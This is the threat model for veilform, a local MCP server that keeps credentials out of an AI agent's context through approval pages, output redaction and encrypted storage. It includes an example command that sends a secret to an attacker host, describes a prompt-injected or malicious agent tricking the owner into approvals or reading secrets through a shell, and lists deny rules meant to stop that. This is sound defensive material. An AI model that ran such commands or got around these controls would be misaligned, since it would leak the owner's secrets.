# Threat model — veilform

> Status: 0.2 (unreleased): intake, approval and use (§1–§7), encrypted sync/sharing/`.env` (§8), own encrypted store and setup (§9). Planned next-generation work (broker, `.veil` container, team mode) is designed in [docs/ENGINEERING-PLAN-NEXT-GEN.md](docs/ENGINEERING-PLAN-NEXT-GEN.md) and is **not** covered here. This document is deliberately honest about what is **not** protected.

## 1. What we are trying to achieve

An AI agent (the "model") coordinates work that needs credentials or sensitive data, but **the values must never enter the model's context**: not the prompt, not tool results, not the chat transcript, not logs that the model or its vendor may read.

The person (the "owner") types values into a page served locally by this MCP server, or lets the server capture them from a web panel in a browser the server owns. From then on, the agent refers to values by name (`${secret:NAME}`) and the server resolves them **inside its own process, at the moment of use**.

## 2. Assets

| Asset | Examples |
|---|---|
| Secret values | API keys (Stripe, Mercado Pago), DB passwords, SSH private keys, web sessions |
| Sensitive business data | Price lists, customer data, RFC/tax ids typed through `blind_input` |
| Bootstrap credentials | Token for a remote store (Vault, Infisical, 1Password Connect, OPS) |
| Approvals | "remember this exact action" fingerprints |
| Audit trail | who/what/when, fingerprints |

## 3. Actors and trust

| Actor | Trust |
|---|---|
| Owner at the keyboard | Trusted. Makes the final decision on every new action. |
| This MCP server process | Trusted computing base (TCB). Runs as the owner's OS user. |
| The model / agent | **Untrusted for confidentiality.** May be confused, prompt-injected, or malicious. May request anything. |
| Model vendor / transcript storage | Untrusted for confidentiality. |
| Other local processes of the same OS user | **Trusted by necessity** (see limits). |
| Remote APIs, SSH hosts, databases | Trusted to receive the values the owner approved for them, nothing more. |
| Web pages opened by `web_capture` | Untrusted content. |

## 4. What is protected (and how)

### 4.1 The model never sees values
- Tool results are structural only: names, statuses, counts, ids, fingerprints, error **codes**.
- Every tool response passes through a final scrub against a process-wide registry of every value the server has handled (form submissions, resolved secrets, captured values), including encodings (see 4.4). If anything matches, it is replaced and an audit event `response_scrubbed` is written.
- Remote error bodies are never returned; SQL errors are reduced to SQLSTATE codes (`\set VERBOSITY sqlstate`), HTTP sink failures to `http_<status>`, Playwright failures to `timeout`/`step_failed` + step index.
- Ids returned from sinks that equal a submitted value are replaced with `h:<sha256 prefix>`.
- Validation errors are `{field, code}`; the page re-renders errors without echoing values back to the server response.
- Tested by property tests over random values: tool responses, the raw JSON-RPC wire, audit log, index file and stderr never contain the value or any of its variants (`test/app.test.ts`, `test/mcp.test.ts`).

### 4.2 Transcripts, argv and logs
- Values never go into **argv** of any process we spawn: keychain CLIs get them on stdin (`secret-tool store`, `security -i`), `gh secret set` on stdin, SSH writes on stdin, SSH passwords through `SSH_ASKPASS` reading a **FIFO** in a 0700 temp dir, psql receives values as `COPY ... FROM STDIN` CSV data, `secret_use exec` passes them via env/stdin of the child.
- `exec` with argv refuses `${secret:…}` inside argv tokens.
- The server logs (stderr) only ids, actions and codes. The audit log stores names, fingerprints, codes, session/agent/client ids.

### 4.3 The local page
- Bound to `127.0.0.1`, ephemeral port. 256-bit URL token, **single use**: the first browser to open it gets an HttpOnly, `SameSite=Strict`, path-scoped cookie; any other client gets `410`. After submit/cancel/expiry the token is dead. Default TTL 10 min.
- POST requires: session cookie, CSRF token in body **and** `X-SI-CSRF` header, `Content-Type: application/json`, `Origin` = this server, `Sec-Fetch-Site: same-origin` when present. `Host` must be `127.0.0.1:<port>`/`localhost:<port>` on every request (DNS-rebinding defence).
- CSP: `default-src 'none'`, scripts and styles only with a per-response nonce, `connect-src 'self'`, `form-action 'none'`, `frame-ancestors 'none'`, no images/fonts/third parties. `Referrer-Policy: no-referrer`, `Cache-Control: no-store`, COOP/CORP/COEP, `Permissions-Policy` (no camera/mic/geo/clipboard-read).
- Model-provided strings (titles, labels, help, templates) are rendered with `textContent` only and embedded as escaped JSON; no `innerHTML`.
- Inputs disable autocomplete/autocorrect/spellcheck and password-manager heuristics; secret inputs are `type=password` with a show/hide toggle.
- On success the form is removed from the DOM.

### 4.4 Output redaction (`secret_use`, `ssh_exec`)
Removes the value and common variants: raw, trimmed, JSON-escaped (single and double), URL-encoded (`%20` and `+`), `encodeURI`, HTML-escaped, shell-quoted, hex (lower/upper), base64 / base64url (with and without padding) **including the value embedded at any byte offset inside a larger base64 blob** (e.g. `Authorization: Basic base64(user:secret)`), each long line of multi-line values (PEM), and a trailing prefix when output was truncated. Output size and time are bounded.

### 4.5 Approvals
- Every **new** `secret_use`, `secret_write` target, non-store `blind_input` sink, `web_capture`/`web_login` plan and `ssh_exec` command needs an explicit click on a local approval page that shows the **literal** action (with `${secret:…}`/`${field}` placeholders, never values), the secrets involved, cwd/host/path/keys and heuristic warnings (shell, network/encoding tools, interpreters).
- The owner may "remember" an approval; it is keyed by the SHA-256 fingerprint of the exact canonical plan. Any change (one character of the command, a header, a different secret, cwd, host, path, key) is a new fingerprint and asks again.
- Clipboard copies are never remembered and happen only from a click on the page (the value is sent to that page only, and cleared after N seconds).

### 4.6 Storage
- `keychain`: OS keychain via Secret Service (`secret-tool`) or macOS `security`.
- `encrypted-file`: AES-256-GCM per entry with the entry name as AAD; key = random 32 bytes in the OS keychain, scrypt (N=2^17) of a passphrase from an env var, or — Veil's own store, `key: {source: "master"}` — argon2id/scrypt of a master password typed on the local page (§9). File 0600, atomic replace.
- `env-file` / `ssh-file` / `secret_write` targets: 0600 by default, temp file + rename (atomic), optional backup, only the requested key changes.
- In-memory cache of resolved values: TTL `cacheTtlSeconds` (default 60 s), cleared on exit. No plaintext cache on disk.
- SSH private keys created by `ssh_key_provision` are stored in the secret store and loaded via `ssh-add -` into a **private ssh-agent** owned by this process (or a 0600 file if the owner prefers).

### 4.7 Allowlists
Everything the model can target is declared by the owner in `config.json`: destinations, SSH hosts, write targets (globs on path/keys/repo/unit), HTTP hosts, databases + tables + columns, web sites + origins. HTTPS is mandatory for remote stores and HTTP actions (plain HTTP only on loopback when explicitly enabled for tests).

### 4.8 Audit
Append-only JSONL with a SHA-256 hash chain (`prev` field); `veilform verify-audit` detects edits/truncation in the middle. Each entry records session id, agent label (`VEILFORM_AGENT`), MCP client name/version, action, fingerprint, names — never values.

## 5. Specific risk: fetching secrets from remote stores by API

`http-api` destinations (Vault KV v2, Infisical, 1Password Connect, OPS addon settings, generic) fetch values **server→server** at the moment of use and write them there at intake time. Risks:

- **Bootstrap secret**: the token for the remote store is itself the crown jewel. It is resolved from a **local** store (`auth.tokenRef`, OS keychain by default) and never from the config file; `http-api` destinations cannot hold their own bootstrap token. Ask the owner to store it once with `secret_request` into the keychain.
- **Blast radius**: whoever controls the local OS user can read the keychain and therefore the bootstrap token, and through it **every** secret the token can read. Use narrowly scoped tokens (per project/environment, read-only where possible, short TTL), and the remote store's own audit.
- **Transport**: TLS is required; custom CA via `caFile`; host allowlist; no redirects are followed; responses are size-limited and never returned to the model.
- **Remote echo**: an API may echo values in error bodies; we never return bodies, only status codes.
- **OPS adapter note**: in the OPS code inspected (`backend/services/addon_service.go`), addon settings are stored as plain `jsonb` and `GET /api/addons/:key/settings` returns them unmasked to any authenticated org member. Treat the OPS adapter as an *example* and verify encryption at rest / role gating before relying on it.

## 6. Honest limits (NOT protected)

1. **An approved action that exfiltrates or transforms the value.** If the owner approves `curl https://attacker/?k=${secret:X}`, or a script that encrypts/reverses/splits the value before printing it, the redactor cannot help. This is why approval pages show the literal action and warn on shells, interpreters and network/encoding tools. Read before you click; do not "remember" shell scripts you do not fully understand.
2. **A malicious or prompt-injected model asking to approve something harmful.** The approval page is the control; social engineering of the owner is out of scope. Keep "remember" for narrow, boring actions.
3. **Same-user local malware or an agent with unrestricted shell.** Anything running as the same OS user can read the keychain (`secret-tool lookup …`), the encrypted file + key, the `.env` files we write, `/proc/<pid>/environ` of children, and can edit `approvals.json`. If your agent also has an unrestricted Bash tool, it can do the same. Mitigations: restrict the agent's shell (Claude Code permission rules: deny `secret-tool`, `security`, `cat`/`Read` on `~/.config/veilform/**` and on the `.env` files you deploy), run the agent sandboxed or as another user.
4. **Values legitimately present in the child's environment.** `exec` puts values in the child's env; in shell mode the shell may put them in grandchildren's argv (e.g. `curl -H "…$TOKEN"`), visible to same-user `ps` during execution.
5. **XSS in the local page.** We render untrusted strings with `textContent` and a nonce CSP, but a browser bug or a future code change could break this. A malicious browser extension can read anything typed in any page.
6. **Phishing look-alike.** A malicious agent could show the owner a URL to a fake page that looks like ours. Always check the address is `http://127.0.0.1:<port>/p/…`; the page shows the request id that also appears in the chat.
7. **Another browser the model controls.** If the agent drives its own browser (e.g. Claude in Chrome, Playwright MCP, computer use) and a page displays a secret, **the model sees it** in page text/screenshots. Use `web_capture` (this server's own browser, which returns nothing but status) whenever a page shows or needs a secret, and do not open credential pages in a browser the agent can see.
8. **Files we deploy are readable by design.** `secret_write` / `env-file` produce plaintext 0600 files for the target service. Anyone/anything that can read them (including the agent's file tools) can read the secret. Keep those paths outside the agent's read scope.
9. **JavaScript strings cannot be zeroised.** Values live briefly in the V8 heap of this process and of the browser tab.
10. **Redaction is heuristic.** Short values (< 3 chars) are not redacted; exotic encodings (base32, gzip, ROT13, per-character output) are not detected.
11. **Clipboard.** Other apps (clipboard managers, sync) may capture the value before it is cleared; clearing only happens while the tab stays open.
12. **SQL via `psql`.** Values are data, never SQL text, but the `psql` argv prefix and target tables/columns come from the owner's config; a misconfigured allowlist widens what the model can write.
13. **Web capture.** We stop the browser from typing secrets or extracting outside allowlisted origins, but a compromised allowlisted site can still receive what it is given.
14. **Windows** keychain backend is not implemented; the own encrypted store (§9) is used instead.

## 7. Recommendations for operators

- Keep the default `ui.openBrowser: true` and use clients that support MCP URL elicitation, so links never need to be copied from the chat.
- Use the keychain or `encrypted-file` with a keychain-held key; avoid `env`-passphrases in `claude mcp add -e` (they end up in the client's config file).
- Scope remote-store tokens narrowly; rotate (`secret_rotate`, `rotate_after_days`).
- Review `approvals.json` periodically; delete entries to force re-approval.
- Run `veilform verify-audit` in your backups.
- Run `veilform doctor` after OS upgrades or when moving to a headless/SSH machine; keep the master password of the own store (§9) in a password manager.
- Use `vault_sync` with a key-file second factor for off-machine copies, and rotate secrets after sharing them with a person (§8.2).

## 8. Sync, sharing and encrypted .env files

### 8.1 What is protected
- **Storage targets see opaque blobs only.** Bundles carry random object ids; names, destinations, tags and values live inside AES-256-GCM ciphertexts. A target learns the number and size of objects, when they change, and the KDF parameters. Tested: no name or value reaches the simulated HTTP/WebDAV/S3 servers, the folder, the git history or the SSH folder (`test/sync.test.ts`).
- **Envelope encryption.** One random DEK per secret (per export) and per share item; DEKs wrapped by the KEK (vault) or the share key. KEK = HKDF(argon2id(passphrase) [64 MiB, 3 passes] or scrypt(N=2^17) ‖ optional key file / keychain secret). Only `node:crypto` primitives; known-answer tests (RFC 7914 scrypt, RFC 9106 argon2id, RFC 5869 HKDF, GCM, AWS SigV4) in `test/crypto.test.ts`. KDF parameters read from a header are bounded (no downgrade, no memory bomb).
- **Integrity / anti-swap / anti-rollback.** The bundle header (version, bundle id, monotonic `seq`, key header, sha256 of every object) is the AAD of the encrypted index; each object binds bundle id, object id, destination, name and version in its AAD. Bit flips, swapped or missing objects, edited headers and wrong keys fail; a bundle older than the highest `seq` seen on this device is refused (`rollback`) unless `allow_rollback`.
- **No silent overwrite.** Vector clocks per secret; concurrent edits are reported (or resolved by an explicit strategy). Deletions are not propagated (no tombstones yet): a secret deleted on one device comes back on the next import.
- **Shares.** Fresh 256-bit key per share, carried in the token's URL fragment `vfs1://<target>/<id>#<key>`: browsers never send fragments, the reveal page copies it into a field and removes it from the address bar/history, the page makes no external request (CSP `connect-src 'self'`, `Referrer-Policy: no-referrer`). Optional passphrase as a second factor (another channel), argon2id-hardened and limited to 5 failed attempts per share id on each machine (then a lock that doubles). Expiry and max views are in the authenticated header (editing them breaks decryption). Every create/read/revoke is in the hash-chained audit log.
- **Model never sees values, keys or tokens.** Passphrases and tokens are typed or shown only on local pages; tool results contain names/counts/ids; tokens given via `token_file`/`token` are registered in the scrub registry. Property tests check responses, MCP wire, audit, stderr, state files and stored blobs for values, the token, its key and the KEK (`test/sync.test.ts`, `test/envtools.test.ts`).
- **Encrypted .env.** Values at rest and in git are AES-256-GCM per value, AAD = context (file/environment name) + key: a value moved to another key or file does not decrypt; a whole-file HMAC detects added/removed/reordered lines. `veilform run` puts values only in the child's environment (not argv, not disk, not the parent env) and redacts its output; `env decrypt` refuses to print plaintext to a pipe.

### 8.2 Honest limits (NOT protected)
1. **Whoever has token + passphrase can decrypt and copy.** Sharing hands out the value; nothing technical can take it back.
2. **Revoking does not make anyone forget.** `share_revoke` deletes the bundle; if it was read (views file present or bundle burnt) rotate the secret (`share_revoke({rotate:true})` opens `secret_rotate`). **After sharing with a person, rotate as a rule** once they no longer need it.
3. **Burn-after-read and max views are best effort.** They are enforced by honest veilform receivers: the counter lives next to the bundle and is updated after reading. A receiver that copies the bundle first, a storage that keeps versions (S3 versioning, Dropbox history, backups) or **a git target (history keeps every bundle forever)** defeats it, and two receivers racing may both read. The local "already consumed" list only stops replays on the same machine. Expiry is checked against the receiver's clock.
4. **The storage provider can delete, withhold or roll back** blobs (denial of service). Rollback is detected only on devices that saw a newer `seq`; a brand-new device trusts the first bundle it sees. There is no lock between devices: two simultaneous pushes may race (the later manifest wins; the next pull reports it).
5. **Offline guessing.** Anyone holding a bundle (or a share bundle with a passphrase) can guess passphrases offline at argon2id/scrypt cost; attempt limits only protect our own UI. Use long passphrases or the key-file second factor.
6. **Key files, keychain, systemd credentials and the session agent** are readable by the same OS user / root (see §6, item 3). The agent socket is 0600 in a 0700 directory: same trust as the keychain. `veilform lock` forgets cached keys; the MCP process also caches KEK/DEKs for `sync.unlockMinutes`.
7. **Encrypted .env keeps key NAMES, comments and the file structure in clear on purpose** (reviewable diffs), and anything that is not a `KEY=value` line stays as is. Values are in clear inside the server process and the child process once decrypted; `secret_use`/`secret_write` from an env file need approval like any other action, and a deployed decrypted `.env` is plaintext on the server (deploy the encrypted file `as_is` + `veilform run` instead). Old ciphertexts stay in git history: rotating the file key does not protect values that were readable with the old key — rotate the values themselves.
8. **`--shred` is best effort**: SSDs, copy-on-write filesystems, snapshots and backups may keep old blocks.
9. **A token in argv** (`--token`) is visible to `ps` and shell history (a warning is printed); `share_import({token})` shows the key to the model — prefer `token_file` or pasting on the page.
10. **Not post-quantum**, no forward secrecy between exports (one KEK protects all bundles until `rekey`).

### 8.3 Comparison
| | veilform | age | sops | 1Password sharing | Vault response wrapping |
|---|---|---|---|---|---|
| Encryption | AES-256-GCM + argon2id/scrypt + HKDF (node:crypto) | X25519/scrypt + ChaCha20-Poly1305 | data key per file, KMS/age/PGP recipients | server-side vault | token-bound cubbyhole |
| Per-value, git-friendly files | yes (`.env`) | no (whole file) | yes (YAML/JSON/.env), MAC over file | no | no |
| Public-key recipients | no (symmetric keys/passphrases) | yes | yes | n/a | n/a |
| Link/token sharing | yes, key in fragment, expiry, views, optional passphrase | no | no | yes (expiry, views, email gating), server enforced | single-use wrapping token, TTL, server enforced |
| Enforcement of views/expiry | client side, best effort | n/a | n/a | server side | server side (strong single use) |
| Model never sees values | yes (local pages, blind use) | n/a | n/a | n/a | n/a |

Use Vault response wrapping or 1Password when you need *server-enforced* single use; use age/sops when you need public-key recipients. veilform's value is that agents can move, back up and share secrets without any value entering the model context.

## 9. Veil's own encrypted store (keychain fallback) and setup

Why it exists: on a machine without `secret-tool` (or with a locked keyring, no D-Bus session, or Windows) `secret_request` to the keychain used to fail with a bare `sink_failed`, and fixing it needed `sudo`. Now the default destination works with nothing installed.

### 9.1 What is protected
- **Format.** The existing `encrypted-file` v1 file: AES-256-GCM per value with the entry name as AAD (values cannot be swapped between names), a check block to detect a wrong password, 0600 + atomic replace. Key = argon2id (64 MiB, 3 passes; Node ≥ 24.7) or scrypt (N=2^17) of the master password with a random salt; KDF parameters read from the header are bounded. Keychain-fallback entries are namespaced `destination:name` and the index records `backend: "vault"` (never a value).
- **The master password never crosses the agent boundary.** It is typed only on the 127.0.0.1 page (same single-use token, cookie binding, CSRF, Origin and CSP as every page) or on the TTY without echo; it is never accepted from MCP arguments or argv. It is registered in the scrub list before use, never logged, never written. Tests check disk (index, audit, store, attempts file), MCP responses and the scrubber for values and the master password (`test/setup.test.ts`, `e2e/setup.spec.ts`).
- **Unlocked state is a derived key, in memory only:** in the session agent (0600 socket in a 0700 directory; `veilform lock` forgets it everywhere; per-process copy ≤ 10 s) or in the MCP process for `localVault.unlockMinutes`. Restarting the process locks it.
- **Online guessing through our UI** is limited to 5 failures per store, then a lockout that doubles (persisted).
- **Consent.** With `fallback: "ask"` (default) a value goes to the encrypted store only after the person accepts it on the page; `auto` is chosen explicitly (`veilform init`); `never` forbids it.
- **Setup never escalates.** `doctor` only reads files, scans PATH and runs read-only, unprivileged probes (`busctl --user get-property … Locked`, `security show-keychain-info`; the D-Bus call may auto-start the user's keyring daemon). `init` only writes the user's veilform directory/config (backup `config.json.bak`). Privileged commands are printed, never executed.

### 9.2 Honest limits (NOT protected)
1. **Forgotten master password = data lost.** There is no recovery and no back door. Keep the password in a password manager or on paper and back up the file; use `veilform export`/`vault_sync` for an off-machine copy.
2. **Offline guessing.** Whoever copies `local-vault.json` can guess offline at argon2id/scrypt cost; only the password strength protects it (minimum 10 characters; use several random words).
3. **Same-user processes** can talk to the session agent, read the MCP process memory or (with `--save-keychain`) read the derived key from the keychain — the same trust boundary as the OS keychain itself (§6).
4. **Entry names** are visible in the file (they are also in the index); values are not.
5. **No global MAC / rollback protection** in `encrypted-file` v1: someone with write access to the file can delete entries or restore an older copy of the whole file (each entry still authenticates).
